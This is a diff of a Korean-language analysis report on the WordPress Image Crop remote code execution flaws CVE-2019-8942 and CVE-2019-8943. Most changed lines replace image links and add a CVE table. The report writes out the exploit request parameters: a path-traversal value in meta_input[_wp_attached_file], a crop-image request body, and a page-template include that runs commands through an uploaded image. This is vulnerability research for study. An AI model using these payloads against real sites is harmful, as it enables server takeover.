@@ -1,12 +1,13 @@
-# WordPress Image CROP RCE 분석 보고서 [블로그용]
+# WordPress Image CROP RCE 분석 보고서
 
 POC & Dockekfile : [https://github.com/synod2/WP_CROP_RCE](https://github.com/synod2/WP_CROP_RCE)
 
 본 문서에서는 Wordpress 4.9.9 및 5.0.1 이전 버전에서 발견된 취약점으로써, WordPress Image CROP RCE로 알려진 CVE-2019-8942와 CVE-2019-8943에 대해 다룬다.
 
-[취약점 정보](https://www.notion.so/19a6c3a19b3f42fb8088389d5b7fa383)
-
-[환경 정보](https://www.notion.so/060c27c48f4b416484499a60203b0c43)
+| CVE 번호      | 공개일    | 설명                                                         |
+| ------------- | --------- | :----------------------------------------------------------- |
+| CVE-2019-8942 | 2019-2-19 | wp_postmeta 테이블 값을 통해 악성코드가 담긴 PHP를 실행, 원격 코드 실행이 가능한 취약점 |
+| CVE-2019-8943 | 2019-2-19 | 업로드된 이미지의 크기정보 따위가 변경되는 동작 발생시, meta_input 파라미터를 이용하여 임의 경로에 파일을 저장할 수 있는 취약점 |
 
 **CVE-2019-8942** 은 이미지 파일의 exif meta data에 php 코드가 삽입된 이미지를 업로드한 후 게시글의 wp_post_meta 테이블내 wp_attached_file 값을 변경, 이미지 파일을 include 하여 임의 코드를 실행할 수 있다.
 
@@ -130,11 +131,11 @@ Megapixels                      : 0.130
 
 ### _wp_attached_file 정보 변조
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled.png)
+![img/Untitled.png](img/Untitled.png)
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%201.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%201.png)
+![img/Untitled%201.png](img/Untitled%201.png)
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%202.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%202.png)
+![img/Untitled%202.png](img/Untitled%202.png)
 
 업로드된 이미지 클릭 - 더 많은 상세 편집 - 업데이트 클릭시 post.php에 전달되는 요청에 **&meta_input[_wp_attached_file]=2021/05/test.jpg?/../../../../themes/twentyseventeen/shell** 파라미터 추가하여 전달
 
@@ -148,13 +149,13 @@ DB에서 **_wp_attached_file** 변조된 것 확인됨
 
 ### crop_image() 호출하여 임의경로에 파일 저장
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%203.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%203.png)
+![img/Untitled%203.png](img/Untitled%203.png)
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%204.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%204.png)
+![img/Untitled%204.png](img/Untitled%204.png)
 
 업로드된 이미지 클릭 - 이미지 편집 - 크기 변경 후 "크기" 버튼 클릭 시 admin-ajax.php 에 전달되는 요청에 파라미터를 변조하여 전달 
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%205.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%205.png)
+![img/Untitled%205.png](img/Untitled%205.png)
 
 ```bash
 action=crop-image&_ajax_nonce=<nonce>&id=<이미지ID>&cropDetails[x1]=480&cropDetails[y1]=480&cropDetails[width]=10&cropDetails[height]=10&cropDetails[dst_width]=10&cropDetails[dst_height]=10&meta_input[_wp_attached_file]=2021/05/test.jpg?/../../../../themes/twentyseventeen/shell
@@ -170,7 +171,7 @@ comments.php  functions.php      page.php    searchform.php  style.css
 
 ### 게시글 템플릿 변경하여 원격 코드 실행
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%206.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%206.png)
+![img/Untitled%206.png](img/Untitled%206.png)
 
 게시글 작성 - post.php에 전달되는 요청에 **&meta_input[_wp_page_template]=cropped-shell.jpg** 파라미터 추가하여 전달, 파일을 게시글에 include 함
 
@@ -178,7 +179,7 @@ comments.php  functions.php      page.php    searchform.php  style.css
 
 ### 결과
 
-![WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%207.png](WordPress%20Image%20CROP%20RCE%20%E1%84%87%E1%85%AE%E1%86%AB%E1%84%89%E1%85%A5%E1%86%A8%20%E1%84%87%E1%85%A9%E1%84%80%E1%85%A9%E1%84%89%E1%85%A5%20%5B%E1%84%87%E1%85%B3%E1%86%AF%E1%84%85%E1%85%A9%E1%84%80%E1%85%B3%E1%84%8B%E1%85%AD%E1%86%BC%2091a63ae892ff466494f18b1df28178d9/Untitled%207.png)
+![img/Untitled%207.png](img/Untitled%207.png)
 
 include 된 이미지파일의 php 코드가 동작하고, 게시글에 post 인자로 넘기는 값이 시스템 명령어로 실행되는 것 확인됨. 
 
